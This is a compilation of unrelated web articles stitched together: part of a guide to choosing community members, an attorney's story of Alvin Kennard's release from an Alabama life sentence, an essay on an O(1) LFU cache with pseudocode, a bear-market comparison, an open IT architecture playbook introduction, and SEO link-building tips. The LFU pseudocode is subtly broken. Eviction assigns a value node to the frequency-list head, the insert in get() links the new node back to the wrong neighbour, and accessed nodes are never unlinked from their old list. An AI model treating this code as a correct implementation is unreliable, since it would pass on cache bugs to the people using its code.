quality determines community success</h3><p>To visualize what makes a community successful, it can help to build a flywheel diagram to show which inputs produce positive outputs. The flywheel for a well-functioning community might look something like this:</p><figure><img src="https://lh6.googleusercontent.com/gqSgANYr0PNoKEs-b5nUhzbkAgM0lO0Z2EjnCZCumedI1_LMqRkxX8ifx5MkO3zqLXMX7Bp5N-qUY8jmzgCBW91d5o3KvzOGM0hV2hz8aZXbVrYEVCZoJi5WG4vw0RDBLxVB8yhJ" alt=""></figure><p>New Member demand helps the community to grow in size generating more membership dues that community leaders can invest in capabilities like events, tools, and staff. These capabilities increase and improve interactions between members, making them more likely to create value for one another and renew their memberships. A healthy member base enhances the community’s reputation, which spurs more new member demand.</p><p>However, as anyone who’s been part of a community knows, bigger communities don’t always have better member experiences. Poorly chosen members can have significant negative impacts on a community.</p><figure><img src="https://lh4.googleusercontent.com/xq5aP4EqyK2_2Zil8z6SmrMjoiTDVm_ib9EFXEkAbi-exhq5I88tnn_0mgefuofS8zmsfRQVcgtY8wamx35B-bcNu8GXlZuEGxqLUi7LZtL0HcF1KeYDb2AdRwBcoMFUiYnbNHyC" alt=""></figure><p>Poorly-chosen members can:</p><ul><li><strong>Make it harder for communities to invest in capabilities</strong> like events or forums, since these members are likely to abuse them.</li><li><strong>Decrease the quality of member interactions</strong> as well as the quantity (since good members may end up avoiding the group)</li><li><strong>Reduce member value</strong> by ruining group cohesion and reducing the ability of members to signal high status through their affiliation with the group</li><li><strong>Lower member retention</strong> since they diminish the value members get from the group</li><li><strong>Diminish the community’s reputation</strong> since it’s clear the group does not have a strong filter for who they admit</li><li><strong>Suppress new member demand</strong> since the community will drive less positive referrals</li></ul><p>Well-chosen members, on the other hand, can have the opposite effect on each of these variables.</p><figure><img src="https://lh5.googleusercontent.com/uFDWj5uDfsXDQbCymMtXbob38YOMv2MMvQR6OLOMklJHzP5zwrBw-xKTM8W0Qz24Bj1w635q92eF0waEVdZfBFCY0CqDUajs2rvire8DtP37Q7I6DFCMUI1Xj8gBP2TbGJqxaQ09" alt=""></figure><p>Context matters. While a junior UX designer might add a lot of value to a group of job seekers trying to break into the field, he likely has little to offer to a group of high-level design leaders. To determine who’s a fit, you’ll want to get an understanding of your ideal member profile and make sure the applicants you are admitting are capable of creating value for your chosen persona.</p><p>When evaluating applicants, it can help try to place them into one of the following categories:</p><figure><img src="https://lh6.googleusercontent.com/ExvUg0KAJFyewoUyS5WaCWeJtRwKRpjfsKO0G64Hs4EAn4ZEc_pNLNgpZCEVHO8YePykSOAUcCdhRZ_99qxV7amohXd9cVcbcDQKJSbS-iog303eThCOn_-Sj24qu6jgXyqJVA2Y" alt=""></figure><ul><li><strong>Adders</strong> will hopefully be the core of your group. They do their best to create more value than they capture and generally make the community a better place.</li><li><strong>Subtractors</strong> are those who are simply not good fits for your group because they can’t provide the type of value that other members want. If one gets through your filter, it’s not the end of the world, but you will risk damaging your member experience if this becomes a pattern.</li><li><strong>Dividers </strong>can be toxic to the point that they end up negatively impacting other members’ behavior in their orbit, creating fights, and sometimes even staging coups against group leaders. If their behavior goes unchecked, they can cause no end of trouble. If you identify one of these people in your group, get them out.</li><li><strong><strong><strong>Multipliers </strong></strong></strong>are members whose positive behavior elevates everyone they come in contact with. These people are quite rare, but when you find one in your community, do anything you can to keep them.</li></ul><p>You’ll also want to consider whether each member can make a <em>distinctive</em> contribution to the rest of the group, or if they just bring more of the same. Amazon wouldn’t be a useful place to shop if it didn’t have a variety of products. Similarly, a community can’t provide much value if its members are too similar. You want to have a good assortment of people with different attitudes, skill sets, and life experiences, so your members can find better matches with one another. Prioritizing group diversity also ensures that members can find their niche and don’t feel too competitive with one another.</p><p><strong>Pro Tip:</strong> <strong>Marquee Members</strong> </p><p>Marquee members are individuals who get recruited into the group based on their external prestige. Early on, you might be tempted to recruit one or two members like this to draw others into the group. However, this is a risky strategy. New members will naturally look to people with external status to determine how to behave. If your group doesn’t yet have its value delivery system figured out, you risk your marquee members disengaging from the group and spreading their attitude to others.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="be-careful-over-investing-in-community-capabilities">Be careful over-investing in community capabilities</h3><p>While members can create a good deal of value, they won’t invest time and energy into the community if they feel like they are doing all the work. That’s why as your member base grows, it’s worth investing in capabilities to help your members discover and interact with one another like:</p><ul><li><strong>Event hosting</strong> &nbsp;to throw retreats, webinars, happy hours, etc.</li><li><strong>Content production</strong> &nbsp;to publicize the accomplishments of members</li><li><strong>Member directories</strong> to enable member discovery</li><li><strong>Knowledge repositories </strong>to artifact and disseminate shared expertise</li><li><strong><strong><strong>Forum hosting </strong></strong></strong>to create spaces for questions to get asked and answered</li><li><strong><strong><strong>Chat moderation </strong></strong></strong>to promote quality interactions</li></ul><p>Most community leaders make the mistake of assuming capabilities like these provide the bulk of benefits members experience. In reality, the value they create depends on the quality of the members in the group. &nbsp;For example, if a community has a bunch of “subtractors” or “dividers,” they may use your member directory to spam the rest of the group. On the contrary, getting six “multipliers” into a well-structured Zoom conversation can create amazing results.</p><p>Another reason not to overdo it on capabilities is that they increase the costs of maintaining your community. Once introduced, costly features can be hard to roll back. No one wants to fire a staff member or discontinue a popular event series. The best solution tends to be keeping costs low until you’re sure you’ve got a sticky community that drives real demand.</p><p><strong>Pro tip: Ask your members to contribute</strong></p><p>In the early days, when money is scarce, your community can punch above its weight by having members chip in to perform various functions. Don’t be afraid to ask members to act as forum moderators or event hosts. People are hungry to …</p></div></section></article></div></div></div>

<p>One year ago, Alvin Kennard stood in a Bessemer courtroom nervous and uncertain. Striped jailhouse scrubs swallowed his rail-thin, shivering frame. After 36 years in a sweltering, unairconditioned prison, the chilled air of Judge David Carpenter’s courtroom was a shock to his system.</p>
<p>What came next was a shock to the justice system.&nbsp; In 1983, Mr. Kennard had been sentenced to life without parole for a $50 robbery at a bakery. Judge Carpenter scrapped that and resentenced him to time served. A courtroom filled with Mr. Kennard’s friends and family erupted in hallelujahs. The television cameras started rolling.&nbsp; As his attorney, and a worrier by nature, I immediately started thinking about next steps: This 58-year-old man had been incarcerated nearly two-thirds of his life. How on earth was he going to adjust to the outside world?</p>
<p>Extremely well, it turned out. Alvin Kennard filed a tax return this year. He tithes at church. He hasn’t even been affected by Covid-19, other than limits on the family gatherings he loves.</p>

<p>Mr. Kennard’s large, supportive family was critical to his successful re-entry. A room was ready in his brother’s home. A niece, who is a Bessemer businessowner, helped with transportation. Church connections helped him secure employment within six weeks at Town and Country Ford, where he works in the body shop buffing cars. Every so often, he calls me on his lunch break and lets me know things are still going just fine. &nbsp;During the holidays, he texted me photos of him at the staff holiday party, standing next to a huge inflatable polar bear. Imagine returning from Alabama’s hellish prisons to a world where holidays are filled with enormous glowing inflatables. Mr. Kennard embraces it all – with joy.</p>
<p>“It’s almost a year I’ve had my job,” he remarked recently. “It’s been a blessing, it’s been wonderful. It’s not about how much money I’m making, it’s about what God allowed me to do.”</p>
<p>He loves listening to the birds chatter in the mornings, wandering down to the creek of his childhood and watching turtles and snakes. He’s got a favorite meat-and-three restaurant, Kayla’s, that’s helped him put on much-needed weight.</p>

<p>All conversations with Alvin Kennard eventually lead toward God. No matter how hard I try to give him credit for how hard he worked, how much he suffered, how he deserves a good life, he invokes God and the conversation becomes a prayer.</p>
<p>I wish more Alabama legislators, judges, and prosecutors could pray with Mr. Kennard.</p>
<p>Until last year, he was labeled a “violent felon” based on his robbery conviction at age 22.&nbsp; Because of three minor non-violent convictions stemming from the same arrest at age 18, he was labeled a habitual offender.&nbsp; Based on the calls and mail that poured into Alabama Appleseed’s office following news of Mr. Kennard’s freedom, there is a world out there that does not see him as a violent felon. &nbsp;“A few month ago, I heard about you. My father was from Alabama, Bessemer, too,” wrote Elizabeth, from Spokane, Washington, who mailed him a little cash – “a gift, so that your days moving forward are hopeful, full of love and belonging.”</p>
<p>Elizabeth acknowledged something else about Mr. Kennard’s story: “I’m learning more about how horrible the police and jail systems are (&amp; the laws, too). It’s not new … but the depth of the corrupt mission is being seen.”</p>
<p>At Appleseed, we’ve also gotten mail from those still stranded in prison honor dorms. Men in their 60s, 70s, one who is 86, sentenced to die in prison for the sins of their youth under Alabama’s draconian Habitual Felony Offender Law. They tell us about their kidney problems, their high blood pressure, their crack-cocaine addictions from the 1980s that led to convenience-store hold ups and courthouse decisions that they were forever beyond redemption. Except now, they are the prisons’ hospice workers, GED teachers, barbers, launderers, preachers, peacemakers, and clean-up crew.&nbsp; “The [whole] time I’ve been in, I’ve worked as a hall runner, shift office runner, infirmary runner and have seen so much brutal violence and had to clean up so much blood out of cells, off of walls and hallways and had to help pick up dead inmates or seem dead and get them to the infirmary,” wrote one man whose conviction dates back to the first Bush Presidency. “I’ve had so much prison blood on my hands, I see it in my sleep.”</p>
<p>Due to the limitations and complexities of Alabama criminal procedure, there is currently no clear vehicle for second chances for these old men in the honor dorms. &nbsp;Mr. Kennard is free only through extraordinary mercy and grace from Judge Carpenter and the Bessemer Cutoff District Attorney’s Office led by Lynneice Washington.</p>

<p>Mr. Kennard turns 60 this year. He will celebrate a full year of employment and get a week’s paid vacation. Most likely he’ll purchase a new suit or two. If there’s one thing I’ve learned about Mr. Kennard this year – beyond his faith and his work ethic – is that he is a sharp dresser, which makes it all the more unfortunate that the cameras were rolling on him while he wore faded jailhouse scrubs.</p>
<p>He is much more himself in his Sunday best.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>A common strategy to make any system super-performant is <em><a href="https://en.wikipedia.org/wiki/Cache_(computing)">Caching</a>.</em> Almost all software products, operating at scale, have multiple layers of caches in their architectures. Caching, when done right, does wonder to the response time and is one of the main reasons why products work so well at a massive scale. Cache engines are limited by the amount of memory available and hence once it gets full the engine has to decide which item should be evicted and that is where an eviction algorithm, like <a href="https://en.wikipedia.org/wiki/Least_frequently_used">LFU</a> and <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a>. kicks in.</p>
<p><a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a> (Least Recently Used) cache eviction strategy is one of the most popular strategies out there. LFU (Least Frequently Used) strategy fares well in some use cases but a concern with its most popular implementation, where it uses a min-heap, is that it provides a running time complexity of <code>O(log n)</code> for all the three operations - insert, update and delete; because of which, more often than not, it is replaced with a sub-optimal yet extremely fast <code>O(1)</code> LRU eviction scheme.</p>
<p>In this essay, we take a look at Constant Time LFU implementation based on the paper <a href="http://dhruvbird.com/lfu.pdf">An O(1) algorithm for implementing the LFU cache eviction scheme</a> by Prof. Ketan Shah, Anirban Mitra and Dhruv Matani, where instead of using a min-heap, it uses a combination of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">doubly-linked lists</a> and <a href="https://en.wikipedia.org/wiki/Hash_table">hash table</a> to gain a running time complexity of <code>O(1)</code> for all the three core operations.</p>

<p>LFU, very commonly, is implemented using a <a href="https://en.wikipedia.org/wiki/Min-max_heap">min-heap</a> which is organized as per the frequency of access of each element. Each element of this heap holds a pair - cached value and the access frequency; and is structured in order of this frequency such that the cached value with the minimum access frequency sits at the top, making it quick to identify the element to be evicted.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/89717235-0fd1f900-d9d2-11ea-968d-9ed67f52a2db.png" alt="min-heap LFU"></p>
<p>Although the identification of the element to be evicted is quick, but in order for the heap to maintain its property - element with lowest access frequency be at the top - it demands a rebalance, and this rebalancing process has a running complexity of <code>O(log n)</code>. To make things worse, rebalancing is required every single time the frequency of an item is changed; which means that in the cache that implements LFU, every time an item is either inserted, accessed or evicted, a rebalance is required - making all the three core operations to have the time complexity of <code>O(log n)</code>.</p>

<p>The LFU cache can be implemented with <code>O(1)</code> complexity for all the three operations by using one <a href="https://en.wikipedia.org/wiki/Hash_table">Hash Table</a> and a bunch of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">Doubly Linked Lists</a>. As stated by the <a href="https://arpitbhayani.me/blogs/rum">RUM Conjecture</a>, in order to get a constant time reads and updates operations, we have to make a compromise with memory utilization. This is exactly what we observe in this implementation.</p>
<h2>The Hash Table</h2>
<p>The Hash Table stores the mapping of the cached key to the Value Node holding the cached value. The value against the key is usually a pointer to the actual Value Node. Given that the lookup complexity of the hash table is <code>O(1)</code>, the operation to access the value given the key from this Hash Table could be accomplished in constant time.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469594-e2561f80-e136-11ea-9ff4-8369a7ea3df3.png" alt="LFU hash table"></p>
<p>The illustration above depicts that the Hash Table holding cache keys <code>k1</code>, <code>k2</code>, etc are mapped to the nodes holding the values <code>v1</code> and <code>v2</code> through direct pointers. The nodes are allocated on the heap using dynamic allocation, hence are a little disorganized. The Value Node to which the key maps to, not only hold the cached value, but it also holds a few pointers pointing to different entities in the system, enabling constant-time operations.</p>
<h2>Doubly Linked Lists</h2>
<p>This implementation of LFU requires us to maintain one Doubly Linked List of frequencies, called <code>freq_list</code>, holding one node for each unique frequency spanning all the caches values. This list is kept sorted on the frequency the node represents such that, the node representing the lowest frequency is on the one end while the node representing the highest frequency is at the other.</p>
<p>Every Frequency Node holds the frequency that it represents in the member <code>freq</code> and the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Frequency Nodes; it also keeps a <code>values_ptr</code> which points to another doubly-linked list holding Value Nodes (referred in the hash table) having the same access frequency <code>freq</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469593-e08c5c00-e136-11ea-995b-e4590981dd89.png" alt="lists LFU"></p>
<p>The overall schematic representation of doubly-linked lists and its arrangement is as shown in the illustration above. The doubly-linked list holding Frequency Nodes is arranged horizontally while the list holding the Value Nodes is arranged vertically, for clearer view and understanding.</p>
<p>Since the cached values <code>v1</code> and <code>v7</code> both have been accessed <code>7</code> times, they both are chained in a doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>7</code>. Similarly, the Value Nodes holding values <code>v5</code>, <code>v3</code>, and <code>v9</code> are chained in another doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>18</code>.</p>
<p>The Value Node contains the cached value in member <code>data</code>, along with the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Value Nodes in the list. It also holds a <code>freq_pointer</code> pointing back to the Frequency Node to which the list if hooked at. Having all of these pointers helps us ensure all the three operations happen in constant time.</p>
<p>Now that we have put all the necessary structures in place, we take a look at the 3 core operations along with their pseudo implementation.</p>
<h2>Adding value to the cache</h2>
<p>Adding a new value to the cache is a relatively simpler operation that requires a bunch of pointer manipulations and does the job with a constant time running complexity. While inserting the value in the cache, we first check the existence of the key in the table, if the key is already present and we try to put it again the function raises an error. Then we ensure the presence of the Frequency Node representing the frequency of <code>1</code>, and in the process, we might also need to create a new frequency node also. Then we wrap the value in a Value Node and adds it to the <code>values_list</code> of this Frequency Node; and at last, we make an entry in the table acknowledging the completion of the caching process.</p>
<pre><code><span><span>def</span> <span>add</span><span>(key: str, value: object)</span>:</span>
    
    
    <span>if</span> key <span>in</span> table:
        <span>raise</span> KeyAlreadyExistsError

    
    
    value_node = make_value_node(value)

    first_frequency_node = freq_list.head
    <span>if</span> first_frequency_node.freq != <span>1</span>:
        
        
        first_frequency_node = make_frequency_node(<span>1</span>)

        
        
        
        first_frequency_node.next = freq_list.head
        freq_list.head.prev = first_frequency_node
        freq_list.head = first_frequency_node

    
    value_node.freq_pointer = first_frequency_node

    
    first_frequency_node.values.add(value_node)

    
    table[key] = value_node
</code></pre>
<p>As seen in the pseudocode above the entire procedure to add a new value in the cache is a bunch of memory allocation along with some pointer manipulations, hence we observe that the running complexity of <code>O(1)</code> for this operation.</p>
<h2>Evicting an item from the cache</h2>
<p>Eviction, similar to insertion, is a trivial operation where we simply pick the frequency node with lowest access frequency (the first node in the <code>freq_list</code>) and remove the first Value Node present in its <code>values_list</code>. Since the entire eviction also requires pointer manipulations, it also exhibits a running complexity of <code>O(1)</code>.</p>
<pre><code><span><span>def</span> <span>evict</span><span>()</span>:</span>
    <span>if</span> freq_list.head <span>and</span> freq_list.head.values:
        first_value_node = freq_list.head.values.first
        second_value_node = first_value_node.next

        
        freq_list.head = second_value_node

        
        second_value_node.prev = <span>None</span>

        
        delete_value_node(first_value_node)

    <span>if</span> freq_list.head <span>and</span> <span>not</span> freq_list.head.values:
        
        
        delete_frequency_node(freq_list.head)
</code></pre>
<h2>Getting a value from the cache</h2>
<p>Accessing an item from the cache has to be the most common operation of any cache. In the LFU scheme, before returning the cached value, the engine also has to update its access frequency. Ensuring the change in access frequency of one cached value does not require some sort of rebalancing or restructuring to maintain the integrity, is what makes this implementation special.</p>
<p>The engine first makes a get call to the Hash Table to check that the key exists in the cache. Before returning the cached value from the retrieved Value Node, the engine performs the following operations - it accesses the Frequency Node and its sibling corresponding to the retrieved Value Node. It ensures that the frequency of the sibling is 1 more than that of the Frequency Node; if not it creates the necessary Frequency Node and place it as the new sibling. The Value Node then changes its affinity to this sibling Frequency Node so that it correctly matches the access frequency. In the end, the back pointer from the Value Node to the new Frequency Node is set and the value is returned.</p>
<pre><code><span><span>def</span> <span>get</span><span>(key: str)</span> -&gt; object:</span>
    
    value_node = table.get(key, <span>None</span>)

    
    
    <span>if</span> <span>not</span> value_node:
        <span>raise</span> KeyNotFoundError

    
    
    frequency_node = value_node.freq_pointer

    
    
    
    next_frequency_node = frequency_node.next

    <span>if</span> next_frequency_node.freq != frequency_node.freq + <span>1</span>:
        
        new_frequency_node = make_frequency_node(frequency_node.freq + <span>1</span>)
        
        
        frequency_node.next = new_frequency_node
        new_frequency_node.prev = frequency_node

        next_frequency_node.prev = new_frequency_node
        new_frequency_node.next = frequency_node

        
        
        next_frequency_node = new_frequency_node

    
    next_frequency_node.values.add(value_node)
    
    
    value_node.freq_pointer = next_frequency_node
    value_node.next = <span>None</span>
    value_node.prev = next_frequency_node.values.last
    
    
    
    <span>if</span> len(frequency_node.values) == <span>0</span>:
        delete_frequency_node(frequency_node)

    
    <span>return</span> value_node.value
</code></pre>
<p>Again, since this operation also only deals with pointer manipulations through direct pointers, the running time complexity of this operation is also constant …</p></div></div></div>

<p>The US market indexes entered bear market territory in March of 2020. It has been a long time since the US has experienced a bear market, 13 years to be precise.  Since the best way to learn about the present is to look at the past, it is a good time for comparing the last 10 bear markets before 2020.</p>



<p>They range in time from 1956 to 2020 and lasted between 18 and 87 months before a total recovery was achieved.  By almost any measurement, the current 2020 bear market is the mildest on record so far.  Lets look at the last 10 bear markets.</p>

<h2>Comparing The Bear Markets</h2>

<p>Looking at the data quite a few things stand out.  The average bear market lasts 42 months overall, but sees 35% drop in the stock market over 14 months before it recovers.  Lets look a little closer.</p>



<h3>How Often Do Bear Markets Occur</h3>



<p>Between 1956 and 2020 there have been a total of 10 bear markets.  This is spread out over 64 years for an average of 6.4 years between markets.   Our last bear market was all the way back in 2007, or 13 years ago.   </p>



<p>By the laws of averages we were way overdue.  Previously, the last longest time between bear markets was also 13 years with the bear market starting in 2000.  Also note, the 2000  bear market saw the second largest drop on record of 49.1%!</p>



<h3>How Long Do Bear Markets Take to Bottom Out</h3>



<p>Bear markets bottomed out over an average of 14 months from the time they begun.  The fastest a market every bottomed out was in 1987 with 3 months. </p>



<p>If the current bear market has bottomed out, and don’t assume it has, it would win the fastest drop to the bottom at a rapid 2 months.</p>



<h3>How Much Do Stocks End Up Dropping</h3>



<p>On average a bear market sees a 35% decline from peak to trough.  The all time peak was 56.8% caused by the great financial crises created by the housing bubble of 2007.</p>



<p>By comparison, 2020’s current max drop of -26.7% from peak is pretty tame.    Don’t assume that stocks have found the bottom though, as of August 2020 this is still a very young bear market.</p>



<h3>How Long Do They Last</h3>



<p>Bear market last 42 months on average, with the shortest on record at 18 months.  This is bad news for those that believe the 2020 bear market is already over.  If this ends up being true, it would be by far the shortest bear market on record.  Let’s just hope we don’t end up at 87 months, which is the longest on record.</p>



<h2>Conclusion</h2>



<p>It is interesting to look back in time comparing the last 10 US stock bear markets.  It is impossible to say how bad the current bear market will get or how long it will last, but judging from the past bear markets it is likely not over yet.  </p>



<p>Considering the economic turmoil that we may still yet have in front of us, it is a good time to review your financial positions and make sure you are comfortable you can weather the storm.  Make sure your assets are diversified and that you are comfortable with your risk profile.  You should be very careful with any <a href="https://www.dollartrak.com/speculating-vs-investing/">speculative</a> holdings that risk total loss.</p>

  <div id="introduction">

<p>Smart people have been thinking on how to create IT architectures as long as there has been computers. Ideas come and go, however creating a good architectures can still be complex and time consuming. Especially when you try to invent the wheel for yourself. With this interactive playbook you can create your IT architecture better and faster. The focus of this architecture playbook is in on:</p>
<ol>
<li><p>Knowledge reuse. Why reinvent the wheel again? It is far and more fun to create a better wheel for your organisation or IT project instead! Focus on the hard complex context specific issues. Use good open tools and knowledge for the easy 80%!</p></li>
<li><p>Easier creation of architecture documents and deliverables. This playbook has an extensive list of all(*) open tools available for creating your IT architecture or design. Using these open tools will speed up the process of creating your architecture deliverables and reduce your risks.</p></li>
<li><p>Quality improvement. By making use of content parts provided for various architecture deliverables you will lower your business risks. Complex business IT projects will fail. Now and in future. But if you make use of proven methods and tools developed from decades of IT architecture scientific research you will lower the risk for your project. Architecture will help to make your projects more successful in terms of costs, speed and profitability.</p></li>
</ol>
<p>(*) If you miss a good open tool that is also usable for IT architecture creation, do not hesitate to contribute to this open publication!</p>
<p>This architecture playbook is divided in the commonly used architecture sections:</p>
<ul>
<li><p>Business</p></li>
<li><p>Data</p></li>
<li><p>Applications and of course</p></li>
<li><p>Technology Infrastructure (TI)</p></li>
</ul>
<p>This playbook is primarily created for on-line usage. But also ePUB and PDF versions are available.</p>
<div id="why-this-architecture-playbook">
<h2>Why this architecture playbook?<a href="#why-this-architecture-playbook" title="Permalink to this headline">¶</a></h2>
<p>Creating a business IT architecture has many benefits. However creating a complete architecture is known to be:</p>
<ul>
<li><p>Difficult</p></li>
<li><p>Time consuming</p></li>
</ul>
<p>Of course many tools have been developed the last 30 years to make creating architecture (documents) easier. However many tools force you into a very tight harness without the needed flexibility. Complex problems need flexible solutions and tools should not slow you down in creating sketches, documents and typical architecture deliverables. A one size fits tool for solving complex business IT problems does not exist. And since creating good architectures is knowledge intensive work that delivers real value for business you should be aware of vendor lock-ins and using methods and tools that do not share knowledge sharing. Open Source tools and open access documentation offer a default head start for reuse and improvement of knowledge work in IT architecture.</p>
<p>You can buy and read many many books on how to do architecture well. All books claim a magic method and promise ultimate success when followed. We love books and reading methods. E.g. TOGAF.  However this playbook is different. This architecture playbook is not about describing how you should create your architecture. You are free to use every method you want. This architecture playbook is all about giving you direct usable content and tools that you can use and reuse for your architecture challenge.</p>
<p>So this playbook brings you ultimate freedom and flexibility. You can export the results from certain tools in any desired format. In this way you can still use your architecture enterprise tool(s) that you already have invested deeply in. So use the outcome of tools within this playbook in combination with the enterprise architecture tool that are mandatory within your organisation.</p>
</div>
<div id="what-is-in-this-architecture-playbook">
<h2>What is in this architecture playbook?<a href="#what-is-in-this-architecture-playbook" title="Permalink to this headline">¶</a></h2>
<p>Many good books and courses already exist that cover the why and how of (Enterprise) IT architecture. So this book will not explain aspects and concepts of the very broad field of IT architecture. This playbook is targeted on providing practical tools for creating your IT architecture or design faster and better. So the focus is 100% on the real thing by using the following leading principles:</p>
<ol>
<li><p>Tools that speed up creating your business IT Architecture.</p></li>
<li><p>Collections of principles, requirements, standards and reference architecture that speed up the creation of your architecture deliverable.</p></li>
<li><p>Collection of various Architecture OSS Tools that speed up creating your business IT architecture.</p></li>
<li><p>Collection of architecture QA  tools to control and manage your IT projects.</p></li>
<li><p>Collection of reusable reference architectures, foundation architecture, architecture journals and more. Knowing where you can find what in an easy way will reduce your time. So you will have more time to spend on solving your problem in your organization.</p></li>
</ol>
</div>
<div id="caution-this-architecture-playbook-contains-open-material-only">
<h2>Caution: This architecture playbook contains <strong>OPEN material</strong> only!<a href="#caution-this-architecture-playbook-contains-open-material-only" title="Permalink to this headline">¶</a></h2>
<p>This architecture playbook is created to be open. This means that:</p>
<ol>
<li><p>This architecture playbook is licensed using a liberal license (CC-BY-SA). This means that you can reuse remix, transform, and build upon the material in this architecture playbook for any purpose.</p></li>
<li><p>All tools mentioned within this architecture playbook are licensed under a OSS license and all documents referenced to is licensed under an CC license whenever possible.</p></li>
</ol>
<p>This gives you the opportunity to reuse and mix content from this architecture playbook the way you want. This also means that all tools mentioned to in this architecture playbook are open and free to use without costs. We believe that sharing tools and knowledge, especially knowledge for making better architectures SHOULD be free.

<div id="notational-conventions">
<h2>Notational Conventions<a href="#notational-conventions" title="Permalink to this headline">¶</a></h2>
<p>This architecture playbook uses the key words “MUST”, “MUST NOT”, “REQUIRED”, “SHALL”, “SHALL NOT”, “SHOULD”, “SHOULD NOT”, “RECOMMENDED”, “MAY”, and “OPTIONAL”. This key words are to be interpreted as described in <a href="https://tools.ietf.org/html/rfc2119">RFC 2119</a>. Using these key words gives clarity and avoids confusion.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p><span>Link building is the process of getting other websites to link back to your website. These links, called backlinks, are essential in how Google determines which websites rank for which keywords. In fact, after studying 11.8 million SERP results, </span><a href="https://backlinko.com/search-engine-ranking"><span>one study</span></a><span> found </span><b>the number of domains linking to a page correlated with rankings more than any other factor. </b><span>Every business owner should be interested in building links to drive referral traffic and increase their site’s authority.&nbsp;</span></p>
<p><span>Link building can be one of the more challenging aspects of SEO. In this post, we’ll answer how to do link building, and walk you through 8 actionable strategies to get a ton of high-quality links to your site.&nbsp;</span></p>
<h2><span>Best Link Building Tactics&nbsp;</span></h2>
<h3><b>1. Blog commenting&nbsp;</b></h3>
<p><span>Building links on blogs could be as easy as leaving a valuable message in the “comments” section of a blog. The sooner you leave a comment after the blog publishes, the better.&nbsp;</span></p>
<p><span>Blog comments also come with two other great benefits:</span></p>
<ol>
<li><span>They help you build relationships within online communities.</span></li>
<li><span>They offer targeted traffic back to your website.</span></li>
</ol>
<p><span>One thing to note is that the comment submission box must have a field to add your website.&nbsp;</span></p>
<p><img src="https://colonyspark.com/wp-content/uploads/2020/08/Comment-form-e1598203782633.png" alt="The comment submission box must have a field to add your website." width="602" height="442"></p>
<p><span>The website field means you can include a link back to your site, that anyone who reads your comment can click. </span><b>Google notices when you get links back from your comments on large, well-established </b><b>blogs</b><b>.</b><span> According to</span> <a href="https://neilpatel.com/blog/blog-comments-links/"><span>this study from Neil Patel</span></a><span>, </span><span>links from high authority sites, even through user-generated content, help with rankings.&nbsp;</span></p>
<p><span>If you choose to use this tactic, you’ll want to focus on blogs that allow Dofollow links in comments. Google uses Dofollow links to figure out how many users link to your page and determine your website’s authority. The more Dofollow links you have, the higher you’ll show up on Google search.&nbsp;</span></p>
<p><span>If you aren’t sure how to find blogs that allow DoFollow links, Google search the following:</span></p>
<ul>
<li><span>“Dofollow blogs” – you’ll discover articles listing out blogs that have Dofollow links.&nbsp;</span></li>
<li><a href="http://followlist.com/"><span>Followlist</span></a><span> – use this directory to find blogs that have Dofollow links.</span></li>
</ul>
<p><span>Actively comment on your niche’s blog posts, and be sure your comment adds value to the topic of the blog. Posting spammy links will just cause your comment to be removed.</span></p>
<h3><b>2. </b> <b>Expert roundup</b></h3>
<p><span>Building alliances with companies that offer products that are complementary to yours or influencers in your space give you a win-win relationship.&nbsp;</span></p>
<p><b>Sharing the opinions of leaders in your industry via an expert roundup blog post will help you build backlinks, boost your website’s traffic, and add SEO value.</b></p>
<p><span>This type of blog post gets a lot of traffic since the experts who are part of the roundup sometimes share the content with their audience. And as an industry expert, they likely have a large following.&nbsp;</span></p>
<p><span>Since roundups are valuable pieces of content, they have a higher chance of being shared by other people, </span><i><span>even if they weren’t one of the contributors</span></i><span>. Plus, the backlinks you’ll get from major websites will boost your domain authority and search ranking.&nbsp;</span></p>
<p><span>To create an expert roundup post, think about a topic relevant to your industry that you’ve always wanted to discuss. Ask the most relevant questions about the topic in your blog post, and answer them with experts in your field.&nbsp;</span></p>
<p><span>Consider using a tool like </span><a href="https://ninjaoutreach.com/"><span>Ninja Outreach</span></a><span> to find and reach out to industry leaders if you’re not sure where to find experts for your roundup post.&nbsp;</span></p>
<h3><b>3. </b> <b>Ego bait</b></h3>
<p><span>Who doesn’t love a little ego boost?</span></p>
<p><span>The ‘ego bait’ link building tactic is similar to the expert roundup strategy. </span><b>If you positively feature another person on your website or blog, they’re more likely to return the favor.</b></p>
<p><span>Like most people, experts and influencers want to be recognized for their accomplishments and skills. By sharing those accomplishments with your audience, you inspire those experts to share your content and link to your website.</span><span> The key here is creating content around a specific person, business, or group of people.</span></p>
<p><span>The main types of ego bait content are:</span></p>
<ul>
<li><span>Interviews</span></li>
<li><span>Roundup Posts</span></li>
<li><span>Listicles</span></li>
<li><span>Directories</span></li>
<li><span>Awards</span></li>
</ul>
<p><span>For example, if your business is a small tech startup, you can make a “51 Game Changers in Tech You Should Follow” list and mention different personalities and websites. They’ll appreciate it and probably will share the content with a link. Pick the right type of content and industry leaders from complementary businesses to reach your SEO goals.</span></p>
<h3><b>4. </b> <b>Local directories</b></h3>
<p><span>Adding your business to an online directory is an easy way to build links and draw traffic to your site.&nbsp;</span></p>
<p><span>People use online directories to locate businesses that sell what they’re shopping for at that very moment—</span><b>since directories index businesses by niche, location, and category, adding your website to a directory attracts highly-targeted (and high purchase-intent) traffic to your website.&nbsp;</b></p>
<p><span>You increase your chances of sales by having your business listed in a directory, and you also boost your business’ visibility. Online directories are trusted sources and are typically high-ranking on Google.&nbsp;</span></p>
<p><span>Most of the time, adding your business to a directory costs you nothing. Many online directories – for example, </span><a href="https://www.bingplaces.com/"><span>Bing Places</span></a><span>, </span><a href="https://biz.yelp.com/"><span>Yelp</span></a><span>, and </span><a href="https://foursquare.com/"><span>Foursquare</span></a><span> – allow you to submit your business information for free. Still, some online directories do charge a listing fee.</span></p>
